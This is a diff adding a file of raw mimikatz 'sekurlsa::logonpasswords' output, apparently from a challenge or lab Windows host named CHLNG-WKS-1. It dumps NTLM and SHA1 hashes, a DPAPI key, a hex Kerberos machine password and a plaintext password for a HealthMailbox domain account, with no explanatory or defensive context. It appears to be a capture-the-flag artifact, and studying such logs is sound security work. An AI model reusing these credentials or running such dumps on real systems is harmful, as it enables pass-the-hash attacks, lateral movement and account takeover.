@@ -1,0 +1,398 @@
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 12/27/2020 4:01:39 PM
+SID               : S-1-5-17
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 92584 (00000000:000169a8)
+Session           : Service from 0
+User Name         : SSISTELEMETRY140
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 12/27/2020 4:01:37 PM
+SID               : S-1-5-80-3110769080-1041181104-338388146-2687983455-1658392935
+	msv :	
+	 [00000003] Primary
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * NTLM     : 86fdb74721e95a00313dc72003155fc8
+	 * SHA1     : 3431a944c5794382911be09b4f331601f075e843
+	tspkg :	
+	wdigest :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * Password : (null)
+	kerberos :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG.com
+	 * Password : 8c 28 7e 1e 68 f9 10 aa 00 c8 ba c6 67 c6 b2 ff 33 38 06 28 a3 5e f3 dd e2 bd 89 e2 f4 04 3d 94 4e 7c ec 96 4c c3 ad 5c a8 00 ff 0e b0 e7 2f 4e 29 68 1b a1 bb 87 37 8e 92 00 06 c9 f4 06 29 5f 1d 46 18 83 78 67 92 91 89 d9 49 df 56 a5 32 11 4f 3f e4 64 fe 4d a4 a5 01 76 a0 c5 9b c7 db 25 36 c4 07 37 36 16 e9 38 64 d7 85 0d 8c f9 49 4a c6 ee fe 36 a8 cb e7 92 13 6b cf 48 7b 6e b2 34 ca b7 06 f4 e5 95 c6 17 88 fb 3c ab 4b 87 c6 1a af e0 a6 e4 c0 c8 b8 85 9c e4 7d e1 72 dd c4 87 af b8 97 21 ca 9e e9 de 3a fb fe 4a 1d cb 06 72 a2 b9 d2 7c 3a 36 c3 60 76 69 e3 5f 0d 05 5d 21 c7 74 4d cc bc 7d 39 70 07 dc f1 c7 7a 54 6f ad 6c 67 24 7c 4c 9f d9 24 88 1a 33 61 cf ad 3d a1 fa 69 0c cd c4 a9 60 3e c7 94 6e 04 e1 52 bc e3 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 91078 (00000000:000163c6)
+Session           : Service from 0
+User Name         : MSSQLSERVER
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 12/27/2020 4:01:37 PM
+SID               : S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
+	msv :	
+	 [00000003] Primary
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * NTLM     : 86fdb74721e95a00313dc72003155fc8
+	 * SHA1     : 3431a944c5794382911be09b4f331601f075e843
+	tspkg :	
+	wdigest :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * Password : (null)
+	kerberos :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 89715 (00000000:00015e73)
+Session           : Service from 0
+User Name         : MsDtsServer140
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 12/27/2020 4:01:37 PM
+SID               : S-1-5-80-3962636388-3248348125-217122445-325585018-661508364
+	msv :	
+	 [00000003] Primary
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * NTLM     : 86fdb74721e95a00313dc72003155fc8
+	 * SHA1     : 3431a944c5794382911be09b4f331601f075e843
+	tspkg :	
+	wdigest :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * Password : (null)
+	kerberos :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG.com
+	 * Password : 8c 28 7e 1e 68 f9 10 aa 00 c8 ba c6 67 c6 b2 ff 33 38 06 28 a3 5e f3 dd e2 bd 89 e2 f4 04 3d 94 4e 7c ec 96 4c c3 ad 5c a8 00 ff 0e b0 e7 2f 4e 29 68 1b a1 bb 87 37 8e 92 00 06 c9 f4 06 29 5f 1d 46 18 83 78 67 92 91 89 d9 49 df 56 a5 32 11 4f 3f e4 64 fe 4d a4 a5 01 76 a0 c5 9b c7 db 25 36 c4 07 37 36 16 e9 38 64 d7 85 0d 8c f9 49 4a c6 ee fe 36 a8 cb e7 92 13 6b cf 48 7b 6e b2 34 ca b7 06 f4 e5 95 c6 17 88 fb 3c ab 4b 87 c6 1a af e0 a6 e4 c0 c8 b8 85 9c e4 7d e1 72 dd c4 87 af b8 97 21 ca 9e e9 de 3a fb fe 4a 1d cb 06 72 a2 b9 d2 7c 3a 36 c3 60 76 69 e3 5f 0d 05 5d 21 c7 74 4d cc bc 7d 39 70 07 dc f1 c7 7a 54 6f ad 6c 67 24 7c 4c 9f d9 24 88 1a 33 61 cf ad 3d a1 fa 69 0c cd c4 a9 60 3e c7 94 6e 04 e1 52 bc e3 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : CHLNG-WKS-1$
+Domain            : CHLNG
+Logon Server      : (null)
+Logon Time        : 12/27/2020 4:01:20 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * Password : (null)
+	kerberos :	
+	 * Username : chlng-wks-1$
+	 * Domain   : CHLNG.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 1969532 (00000000:001e0d7c)
+Session           : NetworkCleartext from 0
+User Name         : HealthMailbox88fa07b
+Domain            : CHLNG
+Logon Server      : CHLNG-PDC-01
+Logon Time        : 12/27/2020 4:04:09 PM
+SID               : S-1-5-21-2993726475-773441375-2775554650-1139
+	msv :	
+	 [00000003] Primary
+	 * Username : HealthMailbox88fa07b
+	 * Domain   : CHLNG
+	 * NTLM     : ffc0139451b34fdb5f7ba33f0a75e086
+	 * SHA1     : ac3e1d44443cc0bb39c02b51011637ba6e75a883
+	 * DPAPI    : 29619708d097e77886ade490630dcbd2
+	tspkg :	
+	wdigest :	
+	 * Username : HealthMailbox88fa07b
+	 * Domain   : CHLNG
+	 * Password : (null)
+	kerberos :	
+	 * Username : HealthMailbox88fa07b
+	 * Domain   : CHLNG.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 1870664 (00000000:001c8b48)
+Session           : NetworkCleartext from 0
+User Name         : HealthMailbox88fa07b
+Domain            : CHLNG
+Logon Server      : CHLNG-PDC-01
+Logon Time        : 12/27/2020 4:04:05 PM
+SID               : S-1-5-21-2993726475-773441375-2775554650-1139
+	msv :	
+	 [00000003] Primary
+	 * Username : HealthMailbox88fa07b
+	 * Domain   : CHLNG
+	 * NTLM     : ffc0139451b34fdb5f7ba33f0a75e086
+	 * SHA1     : ac3e1d44443cc0bb39c02b51011637ba6e75a883
+	 * DPAPI    : 29619708d097e77886ade490630dcbd2
+	tspkg :	
+	wdigest :	
+	 * Username : HealthMailbox88fa07b
+	 * Domain   : CHLNG
+	 * Password : (null)
+	kerberos :	
+	 * Username : HealthMailbox88fa07b
+	 * Domain   : CHLNG.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 89545 (00000000:00015dc9)
+Session           : Service from 0
+User Name         : SSASTELEMETRY
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 12/27/2020 4:01:37 PM
+SID               : S-1-5-80-1549978933-2891762758-2075524219-3728768389-1145206490
+	msv :	
+	 [00000003] Primary
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * NTLM     : 86fdb74721e95a00313dc72003155fc8
+	 * SHA1     : 3431a944c5794382911be09b4f331601f075e843
+	tspkg :	
+	wdigest :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * Password : (null)
+	kerberos :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG.com
+	 * Password : 8c 28 7e 1e 68 f9 10 aa 00 c8 ba c6 67 c6 b2 ff 33 38 06 28 a3 5e f3 dd e2 bd 89 e2 f4 04 3d 94 4e 7c ec 96 4c c3 ad 5c a8 00 ff 0e b0 e7 2f 4e 29 68 1b a1 bb 87 37 8e 92 00 06 c9 f4 06 29 5f 1d 46 18 83 78 67 92 91 89 d9 49 df 56 a5 32 11 4f 3f e4 64 fe 4d a4 a5 01 76 a0 c5 9b c7 db 25 36 c4 07 37 36 16 e9 38 64 d7 85 0d 8c f9 49 4a c6 ee fe 36 a8 cb e7 92 13 6b cf 48 7b 6e b2 34 ca b7 06 f4 e5 95 c6 17 88 fb 3c ab 4b 87 c6 1a af e0 a6 e4 c0 c8 b8 85 9c e4 7d e1 72 dd c4 87 af b8 97 21 ca 9e e9 de 3a fb fe 4a 1d cb 06 72 a2 b9 d2 7c 3a 36 c3 60 76 69 e3 5f 0d 05 5d 21 c7 74 4d cc bc 7d 39 70 07 dc f1 c7 7a 54 6f ad 6c 67 24 7c 4c 9f d9 24 88 1a 33 61 cf ad 3d a1 fa 69 0c cd c4 a9 60 3e c7 94 6e 04 e1 52 bc e3 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 44633 (00000000:0000ae59)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/27/2020 4:01:23 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * NTLM     : 86fdb74721e95a00313dc72003155fc8
+	 * SHA1     : 3431a944c5794382911be09b4f331601f075e843
+	tspkg :	
+	wdigest :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * Password : (null)
+	kerberos :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG.com
+	 * Password : 8c 28 7e 1e 68 f9 10 aa 00 c8 ba c6 67 c6 b2 ff 33 38 06 28 a3 5e f3 dd e2 bd 89 e2 f4 04 3d 94 4e 7c ec 96 4c c3 ad 5c a8 00 ff 0e b0 e7 2f 4e 29 68 1b a1 bb 87 37 8e 92 00 06 c9 f4 06 29 5f 1d 46 18 83 78 67 92 91 89 d9 49 df 56 a5 32 11 4f 3f e4 64 fe 4d a4 a5 01 76 a0 c5 9b c7 db 25 36 c4 07 37 36 16 e9 38 64 d7 85 0d 8c f9 49 4a c6 ee fe 36 a8 cb e7 92 13 6b cf 48 7b 6e b2 34 ca b7 06 f4 e5 95 c6 17 88 fb 3c ab 4b 87 c6 1a af e0 a6 e4 c0 c8 b8 85 9c e4 7d e1 72 dd c4 87 af b8 97 21 ca 9e e9 de 3a fb fe 4a 1d cb 06 72 a2 b9 d2 7c 3a 36 c3 60 76 69 e3 5f 0d 05 5d 21 c7 74 4d cc bc 7d 39 70 07 dc f1 c7 7a 54 6f ad 6c 67 24 7c 4c 9f d9 24 88 1a 33 61 cf ad 3d a1 fa 69 0c cd c4 a9 60 3e c7 94 6e 04 e1 52 bc e3 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 44593 (00000000:0000ae31)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/27/2020 4:01:23 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * NTLM     : 86fdb74721e95a00313dc72003155fc8
+	 * SHA1     : 3431a944c5794382911be09b4f331601f075e843
+	tspkg :	
+	wdigest :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * Password : (null)
+	kerberos :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG.com
+	 * Password : 8c 28 7e 1e 68 f9 10 aa 00 c8 ba c6 67 c6 b2 ff 33 38 06 28 a3 5e f3 dd e2 bd 89 e2 f4 04 3d 94 4e 7c ec 96 4c c3 ad 5c a8 00 ff 0e b0 e7 2f 4e 29 68 1b a1 bb 87 37 8e 92 00 06 c9 f4 06 29 5f 1d 46 18 83 78 67 92 91 89 d9 49 df 56 a5 32 11 4f 3f e4 64 fe 4d a4 a5 01 76 a0 c5 9b c7 db 25 36 c4 07 37 36 16 e9 38 64 d7 85 0d 8c f9 49 4a c6 ee fe 36 a8 cb e7 92 13 6b cf 48 7b 6e b2 34 ca b7 06 f4 e5 95 c6 17 88 fb 3c ab 4b 87 c6 1a af e0 a6 e4 c0 c8 b8 85 9c e4 7d e1 72 dd c4 87 af b8 97 21 ca 9e e9 de 3a fb fe 4a 1d cb 06 72 a2 b9 d2 7c 3a 36 c3 60 76 69 e3 5f 0d 05 5d 21 c7 74 4d cc bc 7d 39 70 07 dc f1 c7 7a 54 6f ad 6c 67 24 7c 4c 9f d9 24 88 1a 33 61 cf ad 3d a1 fa 69 0c cd c4 a9 60 3e c7 94 6e 04 e1 52 bc e3 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : CHLNG-WKS-1$
+Domain            : CHLNG
+Logon Server      : (null)
+Logon Time        : 12/27/2020 4:01:22 PM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * NTLM     : 86fdb74721e95a00313dc72003155fc8
+	 * SHA1     : 3431a944c5794382911be09b4f331601f075e843
+	tspkg :	
+	wdigest :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * Password : (null)
+	kerberos :	
+	 * Username : chlng-wks-1$
+	 * Domain   : CHLNG.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 24249 (00000000:00005eb9)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 12/27/2020 4:01:20 PM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * NTLM     : 86fdb74721e95a00313dc72003155fc8
+	 * SHA1     : 3431a944c5794382911be09b4f331601f075e843
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	 [00000000]
+	 * Username : HealthMailbox88fa07b4457a4de3bc3da6b5d4c5a1d9@CHLNG.com
+	 * Domain   : (null)
+	 * Password : V$)=6mC.fv23Gega?wJPzWLj!%L(:N8arCo_lA%r8!@T!!qK*XazR(F;$@d:$^fZLuS3h}p@*}LzztwKHsn2FKfNzwMYtPt;Qz8iwD)k^HS/p@E*xU{EkJ:w1oOb850^
+	 [00000001]
+	 * Username : HealthMailbox88fa07b4457a4de3bc3da6b5d4c5a1d9@CHLNG.com
+	 * Domain   : (null)
+	 * Password : V$)=6mC.fv23Gega?wJPzWLj!%L(:N8arCo_lA%r8!@T!!qK*XazR(F;$@d:$^fZLuS3h}p@*}LzztwKHsn2FKfNzwMYtPt;Qz8iwD)k^HS/p@E*xU{EkJ:w1oOb850^
+	credman :	
+
+Authentication Id : 0 ; 228632 (00000000:00037d18)
+Session           : Service from 0
+User Name         : MSSQLFDLauncher
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 12/27/2020 4:02:06 PM
+SID               : S-1-5-80-3263513310-3392720605-1798839546-683002060-3227631582
+	msv :	
+	 [00000003] Primary
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * NTLM     : 86fdb74721e95a00313dc72003155fc8
+	 * SHA1     : 3431a944c5794382911be09b4f331601f075e843
+	tspkg :	
+	wdigest :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * Password : (null)
+	kerberos :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG.com
+	 * Password : 8c 28 7e 1e 68 f9 10 aa 00 c8 ba c6 67 c6 b2 ff 33 38 06 28 a3 5e f3 dd e2 bd 89 e2 f4 04 3d 94 4e 7c ec 96 4c c3 ad 5c a8 00 ff 0e b0 e7 2f 4e 29 68 1b a1 bb 87 37 8e 92 00 06 c9 f4 06 29 5f 1d 46 18 83 78 67 92 91 89 d9 49 df 56 a5 32 11 4f 3f e4 64 fe 4d a4 a5 01 76 a0 c5 9b c7 db 25 36 c4 07 37 36 16 e9 38 64 d7 85 0d 8c f9 49 4a c6 ee fe 36 a8 cb e7 92 13 6b cf 48 7b 6e b2 34 ca b7 06 f4 e5 95 c6 17 88 fb 3c ab 4b 87 c6 1a af e0 a6 e4 c0 c8 b8 85 9c e4 7d e1 72 dd c4 87 af b8 97 21 ca 9e e9 de 3a fb fe 4a 1d cb 06 72 a2 b9 d2 7c 3a 36 c3 60 76 69 e3 5f 0d 05 5d 21 c7 74 4d cc bc 7d 39 70 07 dc f1 c7 7a 54 6f ad 6c 67 24 7c 4c 9f d9 24 88 1a 33 61 cf ad 3d a1 fa 69 0c cd c4 a9 60 3e c7 94 6e 04 e1 52 bc e3 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 91347 (00000000:000164d3)
+Session           : Service from 0
+User Name         : SQLTELEMETRY
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 12/27/2020 4:01:37 PM
+SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
+	msv :	
+	 [00000003] Primary
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * NTLM     : 86fdb74721e95a00313dc72003155fc8
+	 * SHA1     : 3431a944c5794382911be09b4f331601f075e843
+	tspkg :	
+	wdigest :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * Password : (null)
+	kerberos :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG.com
+	 * Password : 8c 28 7e 1e 68 f9 10 aa 00 c8 ba c6 67 c6 b2 ff 33 38 06 28 a3 5e f3 dd e2 bd 89 e2 f4 04 3d 94 4e 7c ec 96 4c c3 ad 5c a8 00 ff 0e b0 e7 2f 4e 29 68 1b a1 bb 87 37 8e 92 00 06 c9 f4 06 29 5f 1d 46 18 83 78 67 92 91 89 d9 49 df 56 a5 32 11 4f 3f e4 64 fe 4d a4 a5 01 76 a0 c5 9b c7 db 25 36 c4 07 37 36 16 e9 38 64 d7 85 0d 8c f9 49 4a c6 ee fe 36 a8 cb e7 92 13 6b cf 48 7b 6e b2 34 ca b7 06 f4 e5 95 c6 17 88 fb 3c ab 4b 87 c6 1a af e0 a6 e4 c0 c8 b8 85 9c e4 7d e1 72 dd c4 87 af b8 97 21 ca 9e e9 de 3a fb fe 4a 1d cb 06 72 a2 b9 d2 7c 3a 36 c3 60 76 69 e3 5f 0d 05 5d 21 c7 74 4d cc bc 7d 39 70 07 dc f1 c7 7a 54 6f ad 6c 67 24 7c 4c 9f d9 24 88 1a 33 61 cf ad 3d a1 fa 69 0c cd c4 a9 60 3e c7 94 6e 04 e1 52 bc e3 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 91112 (00000000:000163e8)
+Session           : Service from 0
+User Name         : MSSQLServerOLAPService
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 12/27/2020 4:01:37 PM
+SID               : S-1-5-80-2872255330-672591203-888807865-2791174282-1554802921
+	msv :	
+	 [00000003] Primary
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * NTLM     : 86fdb74721e95a00313dc72003155fc8
+	 * SHA1     : 3431a944c5794382911be09b4f331601f075e843
+	tspkg :	
+	wdigest :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG
+	 * Password : (null)
+	kerberos :	
+	 * Username : CHLNG-WKS-1$
+	 * Domain   : CHLNG.com
+	 * Password : 8c 28 7e 1e 68 f9 10 aa 00 c8 ba c6 67 c6 b2 ff 33 38 06 28 a3 5e f3 dd e2 bd 89 e2 f4 04 3d 94 4e 7c ec 96 4c c3 ad 5c a8 00 ff 0e b0 e7 2f 4e 29 68 1b a1 bb 87 37 8e 92 00 06 c9 f4 06 29 5f 1d 46 18 83 78 67 92 91 89 d9 49 df 56 a5 32 11 4f 3f e4 64 fe 4d a4 a5 01 76 a0 c5 9b c7 db 25 36 c4 07 37 36 16 e9 38 64 d7 85 0d 8c f9 49 4a c6 ee fe 36 a8 cb e7 92 13 6b cf 48 7b 6e b2 34 ca b7 06 f4 e5 95 c6 17 88 fb 3c ab 4b 87 c6 1a af e0 a6 e4 c0 c8 b8 85 9c e4 7d e1 72 dd c4 87 af b8 97 21 ca 9e e9 de 3a fb fe 4a 1d cb 06 72 a2 b9 d2 7c 3a 36 c3 60 76 69 e3 5f 0d 05 5d 21 c7 74 4d cc bc 7d 39 70 07 dc f1 c7 7a 54 6f ad 6c 67 24 7c 4c 9f d9 24 88 1a 33 61 cf ad 3d a1 fa 69 0c cd c4 a9 60 3e c7 94 6e 04 e1 52 bc e3 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 12/27/2020 4:01:23 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz(commandline) # exit
+Bye!
